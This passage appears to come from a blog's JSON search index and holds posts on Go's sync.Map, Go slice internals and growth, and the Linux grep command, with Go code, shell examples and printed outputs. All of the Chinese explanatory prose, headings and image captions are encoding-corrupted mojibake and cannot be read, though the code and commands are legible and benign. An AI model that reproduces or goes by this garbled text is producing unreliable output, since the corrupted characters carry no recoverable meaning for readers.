è½½æ•°æ®çš„æŒ‡é’ˆï¼Œå¦‚æœæŒ‡é’ˆä¸ºç©ºæˆ–å·²è¢«æ ‡è®°åˆ é™¤ï¼Œé‚£ä¹ˆè¿”å›falseï¼Œåˆ é™¤å¤±è´¥\n        p := atomic.LoadPointer(&e.p)\n        if p == nil || p == expunged {\n            return false\n        }\n        \n        // åŸå­æ“ä½œ\n        if atomic.CompareAndSwapPointer(&e.p, p, nil) {\n            return true\n        }\n    }\n}\n```\n\n<img src=\"golangçš„sync_mapå®ç°åŸç†/0327370848ef4d648b19d1209bf4d160.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom:70%;\" />\n\n\n\né€šè¿‡é˜…è¯»æºç æˆ‘ä»¬å‘ç°sync.Mapæ˜¯é€šè¿‡å†—ä½™çš„ä¸¤ä¸ªæ•°æ®ç»“æ„(readã€dirty),å®ç°æ€§èƒ½çš„æå‡ã€‚\n\nä¸ºäº†æå‡æ€§èƒ½ï¼Œloadã€deleteã€storeç­‰æ“ä½œå°½é‡ä½¿ç”¨åªè¯»çš„readï¼›ä¸ºäº†æé«˜readçš„keyå‡»ä¸­æ¦‚ç‡ï¼Œé‡‡ç”¨åŠ¨æ€è°ƒæ•´ï¼Œå°†dirtyæ•°æ®æå‡ä¸ºreadï¼›å¯¹äºæ•°æ®çš„åˆ é™¤ï¼Œé‡‡ç”¨å»¶è¿Ÿæ ‡è®°åˆ é™¤æ³•ï¼Œåªæœ‰åœ¨æå‡dirtyçš„æ—¶å€™æ‰åˆ é™¤ã€‚\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://cloud.tencent.com/developer/article/1918426\n+ https://developer.aliyun.com/article/1172753\n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"golangçš„sliceå®ç°åŸç†","url":"%2Fp%2Fc35a2107.html","content":"\nslice åˆ‡ç‰‡ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºåŠ¨æ€æ•°ç»„ã€‚ä¸æ•°ç»„ç›¸æ¯”åˆ‡ç‰‡çš„é•¿åº¦æ˜¯ä¸å›ºå®šçš„ï¼Œå¯ä»¥è¿½åŠ å…ƒç´ ï¼Œåœ¨è¿½åŠ æ—¶å¯èƒ½ä½¿åˆ‡ç‰‡çš„å®¹é‡å¢å¤§ã€‚\n\n<!-- more -->\n\n# 1. ä»‹ç»\n\n### 1.1 æ•°æ®ç»“æ„\n\n```go\ntype SliceHeader struct {\n\tData uintptr\n\tLen  int\n\tCap  int\n}\n```\n\n- `Data` æ˜¯æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆ;\n- `Len` æ˜¯å½“å‰åˆ‡ç‰‡çš„é•¿åº¦ï¼›\n- `Cap` æ˜¯å½“å‰åˆ‡ç‰‡çš„å®¹é‡ï¼Œå³ `Data` æ•°ç»„çš„å¤§å°ï¼š\n\n![golang-slice-struct](golangçš„sliceå®ç°åŸç†/1.png)\n\n\n\n### 1.2 åˆå§‹åŒ–\n\n##### 1. make\n\n```go\nslice := make([]int, 10)\n```\n\nåˆ›å»ºåˆ‡ç‰‡çš„è¿è¡Œæ—¶å‡½æ•° [`runtime.makeslice`]ä¸»è¦å·¥ä½œæ˜¯è®¡ç®—åˆ‡ç‰‡å ç”¨çš„å†…å­˜ç©ºé—´å¹¶åœ¨å †ä¸Šç”³è¯·ä¸€ç‰‡è¿ç»­çš„å†…å­˜ï¼Œå®ƒä½¿ç”¨å¦‚ä¸‹çš„æ–¹å¼è®¡ç®—å ç”¨çš„å†…å­˜ï¼š\n\nå†…å­˜ç©ºé—´ = åˆ‡ç‰‡ä¸­å…ƒç´ å¤§å° Ã— åˆ‡ç‰‡å®¹é‡\n\n```go\nfunc makeslice(et *_type, len, cap int) unsafe.Pointer {\n\tmem, overflow := math.MulUintptr(et.size, uintptr(cap))\n\tif overflow || mem > maxAlloc || len < 0 || len > cap {\n\t\tmem, overflow := math.MulUintptr(et.size, uintptr(len))\n\t\tif overflow || mem > maxAlloc || len < 0 {\n\t\t\tpanicmakeslicelen()\n\t\t}\n\t\tpanicmakeslicecap()\n\t}\n\n\treturn mallocgc(mem, et, true)\n}\n```\n\n##### 2. å­—é¢é‡åˆå§‹åŒ–\n\n```go\nslice := []int{1, 2, 3}\n```\n\nå½“æˆ‘ä»¬ä½¿ç”¨å­—é¢é‡ `[]int{1, 2, 3}` åˆ›å»ºæ–°çš„åˆ‡ç‰‡æ—¶, è¿˜æ˜¯ä¼šåˆ›å»ºä¸€ä¸ªæ•°ç»„, ç„¶åé€šè¿‡ `[:]` æ“ä½œè·å–ä¸€ä¸ªåº•å±‚åˆ‡ç‰‡.\n\n##### 3. ä¸‹æ ‡èŒƒå›´\n\n```go\narr[0:3]\n```\n\nä½¿ç”¨ä¸‹æ ‡åˆå§‹åŒ–åˆ‡ç‰‡ä¸ä¼šæ‹·è´åŸæ•°ç»„æˆ–è€…åŸåˆ‡ç‰‡ä¸­çš„æ•°æ®ï¼Œå®ƒåªä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å‘åŸæ•°ç»„çš„åˆ‡ç‰‡ç»“æ„ä½“ï¼Œæ‰€ä»¥ä¿®æ”¹æ–°åˆ‡ç‰‡çš„æ•°æ®ä¹Ÿä¼šä¿®æ”¹åŸåˆ‡ç‰‡ã€‚\n\n```go\nfunc main() {\n\tarr1 := []int{1, 2, 3, 4, 5}\n\tarr2 := arr1[1:3]\n\tfmt.Println(arr1, arr2)\n\tarr2[0] = 100\n\tfmt.Println(arr1, arr2)\n}\n\n/*\n[1 2 3 4 5] [2 3]\n[1 100 3 4 5] [100 3]\n*/\n```\n\n# 2. ä½¿ç”¨è¿‡ç¨‹\n\n### 2.1 ä¸åŒåˆå§‹åŒ–æ–¹å¼\n\n```go\nslice := []int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}\ns1 := slice[2:5]   // 2,3,4\ns2 := s1[2:6:7] \t // data[low, high, max]  4,5,6,7\n```\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/3.png\" alt=\"slice origin\" style=\"zoom:30%;\" />\n\n### 2.2 ä¿®æ”¹å¼•ç”¨\n\næ¥ç€ï¼Œå‘ `s2` å°¾éƒ¨è¿½åŠ ä¸€ä¸ªå…ƒç´  100ï¼š\n\n```go\ns2 = append(s2, 100)\n```\n\n`s2` å®¹é‡åˆšå¥½å¤Ÿï¼Œç›´æ¥è¿½åŠ ã€‚ä¸è¿‡ï¼Œè¿™ä¼šä¿®æ”¹åŸå§‹æ•°ç»„å¯¹åº”ä½ç½®çš„å…ƒç´ ã€‚è¿™ä¸€æ”¹åŠ¨ï¼Œæ•°ç»„å’Œ `s1` éƒ½å¯ä»¥çœ‹å¾—åˆ°ã€‚\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/2.png\" alt=\"append 100\" style=\"zoom:30%;\" />\n\n### 2.3 æ‰©å®¹æ‹·è´\n\nå†æ¬¡å‘ `s2` è¿½åŠ å…ƒç´ 200ï¼š\n\n```go\ns2 = append(s2, 200)\n```\n\nè¿™æ—¶ï¼Œ`s2` çš„å®¹é‡ä¸å¤Ÿç”¨ï¼Œè¯¥æ‰©å®¹äº†ã€‚äºæ˜¯ï¼Œ`s2` å¦èµ·ç‚‰ç¶ï¼Œå°†åŸæ¥çš„å…ƒç´ å¤åˆ¶æ–°çš„ä½ç½®ï¼Œæ‰©å¤§è‡ªå·±çš„å®¹é‡ã€‚\n\nå¹¶ä¸”ä¸ºäº†åº”å¯¹æœªæ¥å¯èƒ½çš„ `append` å¸¦æ¥çš„å†ä¸€æ¬¡æ‰©å®¹ï¼Œ`s2` ä¼šåœ¨æ­¤æ¬¡æ‰©å®¹çš„æ—¶å€™å¤šç•™ä¸€äº› `buffer`ï¼Œå°†æ–°çš„å®¹é‡å°†æ‰©å¤§ä¸ºåŸå§‹å®¹é‡çš„2å€ï¼Œä¹Ÿå°±æ˜¯10äº†ã€‚\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/5.png\" alt=\"append 200\" style=\"zoom:30%;\" />\n\n### 4.4 ä¿®æ”¹å…¶ä»–å¼•ç”¨\n\næœ€åï¼Œä¿®æ”¹ `s1` ç´¢å¼•ä¸º2ä½ç½®çš„å…ƒç´ ï¼š\n\n```\ns1[2] = 20\n```\n\nè¿™æ¬¡åªä¼šå½±å“åŸå§‹æ•°ç»„ç›¸åº”ä½ç½®çš„å…ƒç´ ã€‚å®ƒå½±å“ä¸åˆ° `s2` äº†ï¼Œäººå®¶å·²ç»è¿œèµ°é«˜é£äº†ã€‚\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/4.png\" alt=\"s1[2]=20\" style=\"zoom:30%;\" />\n\nå†æä¸€ç‚¹ï¼Œæ‰“å° `s1` çš„æ—¶å€™ï¼Œåªä¼šæ‰“å°å‡º `s1` é•¿åº¦ä»¥å†…çš„å…ƒç´ ã€‚æ‰€ä»¥ï¼Œåªä¼šæ‰“å°å‡º3ä¸ªå…ƒç´ ï¼Œè™½ç„¶å®ƒçš„åº•å±‚æ•°ç»„ä¸æ­¢3ä¸ªå…ƒç´ ã€‚\n\n# 3. æ‰©å®¹æœºåˆ¶\n\n### 3.1 æºä»£ç \n\n```go\nfunc growslice(et *_type, old slice, cap int) slice {\n\tnewcap := old.cap\n\tdoublecap := newcap + newcap\n\tif cap > doublecap {\n\t\tnewcap = cap\n\t} else {\n\t\tif old.len < 1024 {\n\t\t\tnewcap = doublecap\n\t\t} else {\n\t\t\tfor 0 < newcap && newcap < cap {\n\t\t\t\tnewcap += newcap / 4\n\t\t\t}\n\t\t\tif newcap <= 0 {\n\t\t\t\tnewcap = cap\n\t\t\t}\n\t\t}\n\t}\n```\n\n\n\n+ å¦‚æœæœŸæœ›å®¹é‡å¤§äºå½“å‰å®¹é‡çš„ä¸¤å€å°±ä¼šä½¿ç”¨æœŸæœ›å®¹é‡ï¼›\n\n+ å¦‚æœå½“å‰åˆ‡ç‰‡çš„é•¿åº¦å°äº 1024 å°±ä¼šå°†å®¹é‡ç¿»å€ï¼›\n\n+ å¦‚æœå½“å‰åˆ‡ç‰‡çš„é•¿åº¦å¤§äº 1024 å°±ä¼šæ¯æ¬¡å¢åŠ  25% çš„å®¹é‡ï¼Œç›´åˆ°æ–°å®¹é‡å¤§äºæœŸæœ›å®¹é‡ï¼›\n\n### 3.2 capä¸è¶³é‡æ–°åˆ†é…\n\nä¸‹é¢è¿™ä¸ªä¾‹å­åº•å±‚ç”¨çš„åŒä¸€ä¸ªæ•°ç»„, capå……è¶³æ²¡æœ‰é‡æ–°åˆ†é…æ–°æ•°ç»„\n\n```go\nfunc main() {\n\tm := make([]int, 3, 4)\n\ta := append(m, 1)\n\tb := append(m, 2)\n\tfmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [0 0 0]   p:0xc00008a000\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [0 0 0 2] p:0xc00008a000\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [0 0 0 2] p:0xc00008a000\n  \n  a[0] = 10\n\tb[0] = 100\n  fmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [100 0 0]   p:0xc00008a000\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [100 0 0 2] p:0xc00008a000\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [100 0 0 2] p:0xc00008a000\n}\n\n```\n\nä¸‹é¢è¿™ä¸ªä¾‹å­, åº•å±‚ç”¨äº†ä¸¤ä¸ªæ•°ç»„, bæ‰©å®¹çš„æ—¶å€™, capä¸è¶³å¦èµ·ç‚‰ç¶äº†ã€‚\n\n```go\nfunc main() {\n\tm := make([]int, 3, 4)\n\ta := append(m, 1)\n\tb := append(a, 2)\n\tfmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [0 0 0]     p:0xc000018220\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [0 0 0 1]   p:0xc000018220\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [0 0 0 1 2] p:0xc00001c180\n  \n  a[0] = 10\n\tb[0] = 100\n\tfmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [10 0 0]      p:0xc000018220\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [10 0 0 1]    p:0xc000018220\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [100 0 0 1 2] p:0xc00001c180\n}\n```\n\n### 3.3 æ‰©å®¹æ—¶åº•å±‚ptræŒ‡å‘æ–°çš„åœ°å€\n\n\n```go\nfunc main() {\n\tss := []int{}\n\tfor i := 1; i < 20; i++ {\n\t\tfmt.Printf(\"addr:%p %p,len:%d,cap:%d\\n\", ss, &ss, len(ss), cap(ss))\n\t\tss = append(ss, i)\n\t}\n}\n\n/*\naddr:0x11aac78    0xc0000a6020,len:0,cap:0\n\naddr:0xc0000b4020 0xc0000a6020,len:1,cap:1\n\naddr:0xc0000b4040 0xc0000a6020,len:2,cap:2\n\naddr:0xc0000b6020 0xc0000a6020,len:3,cap:4\naddr:0xc0000b6020 0xc0000a6020,len:4,cap:4\n\naddr:0xc0000b8040 0xc0000a6020,len:5,cap:8\naddr:0xc0000b8040 0xc0000a6020,len:6,cap:8\naddr:0xc0000b8040 0xc0000a6020,len:7,cap:8\naddr:0xc0000b8040 0xc0000a6020,len:8,cap:8\n\naddr:0xc0000ba000 0xc0000a6020,len:9,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:10,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:11,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:12,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:13,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:14,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:15,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:16,cap:16\n\naddr:0xc0000bc000 0xc0000a6020,len:17,cap:32\naddr:0xc0000bc000 0xc0000a6020,len:18,cap:32\n\n*/\n```\n\n+ å¯ä»¥çœ‹å‡º, cap æ˜¯2å€å¢é•¿çš„(<1024)\n\n+ å½“capå˜åŒ–çš„æ—¶å€™ï¼Œss çš„æŒ‡é’ˆå˜äº†ã€‚\n+ &ss çš„æŒ‡é’ˆæ²¡æœ‰å˜ï¼Œå› ä¸º &ssæ“ä½œè¿”å›çš„æ˜¯è¯¥åˆ‡ç‰‡çš„å†…éƒ¨æŒ‡é’ˆåœ°å€ã€‚\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/qcrao-2018/p/10631989.html\n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"grepå‘½ä»¤çš„ä½¿ç”¨ä»‹ç»","url":"%2Fp%2F6dc03659.html","content":"\ngrepæ˜¯Linuxä¸­æœ€å¸¸ç”¨çš„â€æ–‡æœ¬å¤„ç†å·¥å…·â€ä¹‹ä¸€ï¼Œgrepä¸sedã€awkåˆç§°ä¸ºLinuxä¸­çš„ä¸‰å‰‘å®¢ã€‚\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨grepå‘½ä»¤åœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå°±åƒæ‰“å¼€txtæ–‡ä»¶ï¼Œä½¿ç”¨ â€œCtrl+Fâ€ åœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŸä¸ªå­—ç¬¦ä¸²ä¸€æ ·ï¼Œè¯´ç™½äº†ï¼Œå¯ä»¥æŠŠgrepç†è§£æˆå­—ç¬¦æŸ¥æ‰¾å·¥å…·ã€‚\n\n<!-- more -->\n\n# 1. ä»‹ç»\n\ngrepçš„å…¨ç§°ä¸ºï¼š **G**lobal search **R**egular **E**xpression and **P**rint out the line, è¡¨ç¤ºå…¨å±€æ­£åˆ™è¡¨è¾¾å¼ç‰ˆæœ¬ï¼Œå®ƒçš„ä½¿ç”¨æƒé™æ˜¯æ‰€æœ‰ç”¨æˆ·ã€‚\n\n`grep`çš„å·¥ä½œæ–¹å¼æ˜¯è¿™æ ·çš„ï¼Œå®ƒåœ¨ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²æ¨¡æ¿ã€‚å¦‚æœæ¨¡æ¿åŒ…æ‹¬ç©ºæ ¼ï¼Œåˆ™å¿…é¡»è¢«å¼•ç”¨ï¼Œæ¨¡æ¿åçš„æ‰€æœ‰å­—ç¬¦ä¸²è¢«çœ‹ä½œæ–‡ä»¶åã€‚æœç´¢çš„ç»“æœè¢«é€åˆ°æ ‡å‡†è¾“å‡ºï¼Œä¸å½±å“åŸæ–‡ä»¶å†…å®¹ã€‚\n\n### 1.1 å®ä¾‹\n\n```bash\n# æŸ¥æ‰¾æŒ‡å®šè¿›ç¨‹\nps -ef|grep python \n\n# æŸ¥æ‰¾æŒ‡å®šè¿›ç¨‹ä¸ªæ•°\nps -ef|grep -c python\n\n# ä»æ–‡ä»¶ä¸­æŸ¥æ‰¾å…³é”®è¯\ngrep 'linux' file1.txt\n\n# æ‰¾å‡ºå·²wå¼€å¤´çš„è¡Œå†…å®¹\ncat file1.txt |grep ^w\n\n# æ‰¾å‡ºéwå¼€å¤´çš„è¡Œå†…å®¹\ncat file2.txt |grep ^[^w]\n\n# è¾“å‡ºä»¥hatç»“å°¾çš„è¡Œå†…å®¹\ncat test.txt |grep hat$\n\n# åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶\ngrep test *file \n\n# ä»¥é€’å½’çš„æ–¹å¼æŸ¥æ‰¾æŒ‡å®šç›®å½•/etc/acpi åŠå…¶å­ç›®å½•ï¼ˆå¦‚æœå­˜åœ¨å­ç›®å½•çš„è¯ï¼‰ä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸²\"update\"çš„æ–‡ä»¶\ngrep -r update /etc/acpi \n```\n\n\n\n# 2. ä½¿ç”¨\n\ncat a.txt, ä»¥ä¸‹é¢çš„æ–‡ä»¶ä¸ºæµ‹è¯•æ–‡ä»¶\n\n```txt\ntest\na\nb\nc\nd\ne\nf\ng\ntest1\nTEST2\n```\n\n\n\n### 2.1 åŸºç¡€æœç´¢\n\næˆ‘ä»¬å…ˆæ¥ä¸€ä¸ªæœ€åŸºç¡€çš„æœç´¢:\n\n```bash\ngrep \"test\" a.txt\n\ntest\ntest1\n```\n\n\n\nå¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨æœç´¢å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œåº”è¯¥æ€æ ·åšå‘¢ï¼Ÿgrepå¾ˆè´´å¿ƒï¼Œä¸ºæˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªé€‰é¡¹ï¼Œä½¿ç”¨â€-iâ€é€‰é¡¹ï¼Œå³å¯åœ¨æœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š\n\n```bash\ngrep -i \"test\" a.txt\n\ntest\ntest1\nTEST2\n```\n\n\n\næˆ‘ä»¬è¿˜æƒ³è¦çŸ¥é“å“ªè¡Œæ–‡æœ¬åŒ…å«â€testâ€å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥ä½¿ç”¨â€-nâ€é€‰é¡¹ï¼Œè¡¨ç¤ºæ˜¾ç¤ºæ‰“å°å‡ºçš„è¡Œåœ¨æ–‡æœ¬ä¸­çš„è¡Œå·ï¼Œç¤ºä¾‹å¦‚ä¸‹\n\n```bash\ngrep -in \"test\" a.txt\n\n1:test\n9:test1\n10:TEST2\n```\n\n\n\nè¢«åŒ¹é…åˆ°çš„å…³é”®å­—æ²¡æœ‰é«˜äº®æ˜¾ç¤ºï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é«˜äº®æ˜¾ç¤ºè¡Œä¸­çš„å…³é”®å­—ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨â€â€“colorâ€é€‰é¡¹ï¼Œé«˜äº®æ˜¾ç¤ºè¡Œä¸­çš„å…³é”®å­—ï¼Œç¤ºä¾‹å¦‚ä¸‹\n\n```bash\ngrep -in --color \"test\" a.txt\n\n# å…¶å®ç»“æœä¸€æ ·, å› ä¸ºåœ¨ mac ä¸‹, grep å·²ç»æ˜¯åˆ«å, æˆ‘ä»¬å¯ä»¥è¾“å‡ºä¸€ä¸‹\n\nalias grep\ngrep='grep --color=auto --exclude-dir={.bzr,CVS,.git,.hg,.svn,.idea,.tox}'\n```\n\n\n\nå¦‚æœæˆ‘ä»¬åªæƒ³çŸ¥é“æœ‰å¤šå°‘è¡ŒåŒ…å«æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œè€Œä¸åœ¨ä¹å“ªäº›è¡ŒåŒ…å«è¿™äº›å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-cï¼Œè·å–åˆ°ç¬¦åˆæ¡ä»¶çš„æ€»è¡Œæ•°ã€‚\n\n```bash\ngrep -ic \"test\" a.txt\n\n3\n```\n\n\n\nå¦‚æœæˆ‘ä»¬åªæƒ³çœ‹è¢«åŒ¹é…åˆ°çš„å…³é”®å­—ï¼Œä¸æƒ³æ•´è¡Œéƒ½è¢«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥å—ï¼Ÿå¿…é¡»çš„ï¼Œä½¿ç”¨â€-oâ€é€‰é¡¹å³å¯åªæ‰“å°å‡ºåŒ¹é…åˆ°çš„å…³æœºå­—ï¼Œè€Œä¸æ‰“å°å‡ºæ•´è¡Œï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\ngrep -ino \"test\" a.txt\n\n1:test\n9:test\n10:TEST\n```\n\nä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œâ€-oâ€é€‰é¡¹ä¼šæŠŠæ¯ä¸ªåŒ¹é…åˆ°çš„å…³é”®å­—éƒ½å•ç‹¬æ˜¾ç¤ºåœ¨ä¸€è¡Œä¸­è¿›è¡Œè¾“å‡º(å³ä¸€è¡Œæœ‰2ä¸ªåŒ¹é…ä¼šè¾“å‡ºä¸¤è¡Œ)\n\n\n\nå¦‚æœæˆ‘ä»¬æœç´¢å†…å®¹, ä½†ç»“æœåªæƒ³å±•ç¤ºæ–‡ä»¶å, å¯ä»¥ç”¨`-l`é€‰é¡¹\n\n```bash\ngrep -l \"test\" a.txt\n\na.txt\n```\n\n\n\nå¦‚æœæˆ‘ä»¬æƒ³æœç´¢æ–‡ä»¶çš„åå­—(æ³¨æ„ä¸æ˜¯å†…å®¹), éœ€è¦ç”¨åˆ° `find`æŒ‡ä»¤\n\n```Â bash\nfind <path> -name *FileName*\n```\n\n\n\n### 2.2 é«˜çº§æœç´¢\n\næˆ‘ä»¬åœ¨ä½¿ç”¨grepå‘½ä»¤æœç´¢æ–‡æœ¬æ—¶ï¼Œå¾€å¾€æœ‰è¿™ç§éœ€æ±‚ï¼šåœ¨æ‰¾åˆ°å¯¹åº”çš„å…³é”®å­—æ—¶ï¼ŒåŒæ—¶éœ€è¦æ˜¾ç¤ºå…³é”®å­—é™„è¿‘çš„ä¿¡æ¯\n\n ä¾‹å¦‚æˆ‘ä»¬å…ˆæ‰¾å­—æ¯c\n\n```bash\ngrep -in \"c\" a.txt\n\n4:c\n```\n\nä¸ä»…æ‰¾å­—æ¯ c, è¿˜æ‰¾é™„è¿‘çš„è¡Œ, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨â€-Bâ€é€‰é¡¹ï¼Œæ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„è¡Œä¹‹å‰çš„è¡Œï¼Œâ€Bâ€æœ‰beforeä¹‹æ„ï¼Œç¤ºä¾‹å¦‚ä¸‹\n\n```bash\ngrep -in -B 3 \"c\" a.txt\n\n1-test\n2-a\n3-b\n4:c\n```\n\nä¸â€-Bâ€é€‰é¡¹å¯¹åº”çš„é€‰é¡¹æ˜¯â€-Aâ€é€‰é¡¹ï¼Œâ€-Bâ€æœ‰Beforeä¹‹æ„ï¼Œâ€-Aâ€æœ‰Afterä¹‹æ„ï¼Œèªæ˜å¦‚ä½ ï¼Œä¸€å®šå·²ç»çŒœåˆ°äº†â€-Aâ€çš„å«ä¹‰ï¼Œæ²¡é”™ï¼Œâ€-Aâ€ä»£è¡¨æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„è¡Œçš„åŒæ—¶ï¼Œè¿˜è¦æ˜¾ç¤ºä¹‹åçš„è¡Œï¼Œâ€-A3â€³è¡¨ç¤ºåŒæ—¶æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„è¡Œä¹‹åçš„3è¡Œã€‚\n\n\n\nè¯´äº†â€-Aâ€ï¼Œè¯´äº†â€-Bâ€ï¼Œç°åœ¨è¯´è¯´â€-Câ€ï¼Œâ€-Câ€é€‰é¡¹å¯ä»¥ç†è§£ä¸ºâ€-Aä¸-Bâ€çš„ç»“åˆï¼Œâ€-Câ€é€‰é¡¹è¡¨ç¤ºåœ¨æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„è¡Œçš„åŒæ—¶ï¼Œä¹Ÿä¼šæ˜¾ç¤ºå…¶å‰åçš„è¡Œï¼Œå¦‚â€-C1â€³ï¼Œâ€-C1â€³è¡¨ç¤ºæ‰“å°ç¬¦åˆæ¡ä»¶çš„è¡Œçš„åŒæ—¶ï¼Œä¹Ÿæ‰“å°å‡ºä¹‹å‰çš„ä¸€è¡Œä¸ä¹‹åçš„ä¸€è¡Œï¼Œâ€-Câ€æœ‰Contextä¹‹æ„ï¼ˆä¸Šä¸‹æ–‡ä¹‹æ„ï¼‰ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\ngrep -in -C 3 \"c\" a.txt\n\n1-test\n2-a\n3-b\n4:c\n5-d\n6-e\n7-f\n```\n\n\n\nç²¾ç¡®åŒ¹é…ï¼Œå°±æ˜¯â€testâ€ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å•è¯å­˜åœ¨ï¼Œè€Œä¸æ˜¯åŒ…å«äºæŸä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæœ‰è¿™ç§éœ€æ±‚ï¼Œæˆ‘ä»¬æ€ä¹ˆåŠå‘¢ï¼Ÿä½¿ç”¨â€-wâ€é€‰é¡¹å¯ä»¥å®ç°æˆ‘ä»¬çš„éœ€æ±‚ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\ngrep -inw test a.txt #â€-wâ€æœ‰wordä¹‹æ„ï¼Œè¡¨ç¤ºæœç´¢çš„å­—ç¬¦ä¸²ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å•è¯æ—¶æ‰ä¼šè¢«åŒ¹é…åˆ°ã€‚\n\n1:test\n```\n\næœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åå‘æŸ¥æ‰¾ï¼Œæ¯”å¦‚ï¼ŒæŸ¥æ‰¾â€ä¸åŒ…å«æŸä¸ªå­—ç¬¦ä¸²â€çš„è¡Œï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°â€-vâ€é€‰é¡¹ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\ngrep -iv test a.txt\n\na\nb\nc\nd\ne\nf\ng\n```\n\n\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥åŒæ—¶åœ¨æ–‡æœ¬ä¸­æœç´¢äº†â€aâ€å­—ç¬¦ä¸²ä¸â€bâ€å­—ç¬¦ä¸²ï¼ŒåŒ…å«è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­ä»»æ„ä¸€ä¸ªçš„è¡Œéƒ½ä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œæ²¡é”™ï¼Œå°±åƒä¸Šå›¾ä¸­çš„ç¤ºä¾‹ä¸€æ ·ï¼Œä½¿ç”¨â€-eâ€é€‰é¡¹å¯ä»¥åŒæ—¶åŒ¹é…å¤šä¸ªç›®æ ‡ï¼Œå¤šä¸ªç›®æ ‡ä¹‹é—´å­˜åœ¨â€æˆ–â€å…³ç³»ï¼Œå³åŒ¹é…å…¶ä¸­çš„ä»»æ„ä¸€ä¸ªéƒ½ç®—ä½œåŒ¹é…æˆåŠŸ\n\n```bash\ngrep -ie a -ie b a.txt\n\na\nb\n```\n\n\n\n### 2.3 